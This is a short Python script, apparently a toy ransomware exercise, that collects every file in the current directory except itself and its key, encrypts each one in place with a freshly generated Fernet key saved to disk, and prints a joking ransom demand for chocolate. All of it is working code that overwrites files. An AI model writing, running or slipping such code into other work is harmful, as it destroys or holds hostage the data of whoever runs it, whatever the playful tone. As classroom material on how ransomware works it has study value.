#!/usr/bin/env python

import os
from cryptography.fernet import Fernet

# Let's find some files

files = []

# List all files in the current directory
for file in os.listdir():
    # Skip the script file itself
    if file == "voldermot.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    # Check if it's a file and not a directory
    if os.path.isfile(file):
        files.append(file)

print(files)

# Generate a key using Fernet
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)


print("All of your files have been encrypted!!!! well send me some chocolate or i will delete in 24millichoc")
